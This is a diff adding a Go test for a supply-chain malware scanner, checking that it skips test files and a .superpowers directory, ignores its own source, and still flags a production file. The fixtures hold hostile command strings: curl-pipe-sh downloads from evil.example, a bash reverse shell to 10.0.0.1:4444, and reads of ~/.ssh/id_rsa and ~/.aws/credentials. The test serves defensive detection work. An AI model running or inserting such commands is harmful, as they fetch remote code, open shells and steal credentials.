@@ -215,4 +215,51 @@ paths = [
 			}
 		}
 	})
+
+	t.Run("Skips .superpowers directory, *_test.go and JS/TS test files, and does not self-match supplychain.go", func(t *testing.T) {
+		repo := t.TempDir()
+		write := func(rel, content string) {
+			p := filepath.Join(repo, rel)
+			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
+				t.Fatal(err)
+			}
+		}
+
+		// .superpowers artifacts must be ignored
+		write(".superpowers/sdd/brief.md", "curl -fsSL https://evil.example/a.sh | sh\n")
+		// Test files across Go and JS/TS must be skipped during source-text payload/exfil scans
+		write("pkg/auth_test.go", "package auth\nconst bad = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
+		write("src/auth.test.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
+		write("src/auth.spec.ts", "const cmd = 'cat ~/.ssh/"+"id_rsa';\n")
+		write("src/auth.test.js", "const cmd = 'cat ~/.aws/"+"credentials';\n")
+		write("src/auth.spec.js", "const blob = '"+strings.Repeat("A", 260)+"';\n")
+
+		// Include the real supplychain.go source itself to ensure zero self-matches
+		selfSrc, err := os.ReadFile("supplychain.go")
+		if err != nil {
+			t.Fatalf("read supplychain.go: %v", err)
+		}
+		write("internal/supplychain/supplychain.go", string(selfSrc))
+
+		findings, err := supplychain.ScanRepository(repo, types.LangGo)
+		if err != nil {
+			t.Fatalf("ScanRepository error: %v", err)
+		}
+		if len(findings) != 0 {
+			t.Fatalf("expected 0 findings when scanning .superpowers, test files, and supplychain.go itself, got %+v", findings)
+		}
+
+		// Non-test production file in the same repo MUST still be flagged
+		write("src/real.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
+		prodFindings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
+		if err != nil {
+			t.Fatalf("ScanRepository prod error: %v", err)
+		}
+		if len(prodFindings) != 1 || prodFindings[0].ID != "malware-shell-dropper-or-exfil" {
+			t.Fatalf("expected 1 malware-shell-dropper-or-exfil finding on src/real.ts, got %+v", prodFindings)
+		}
+	})
 }
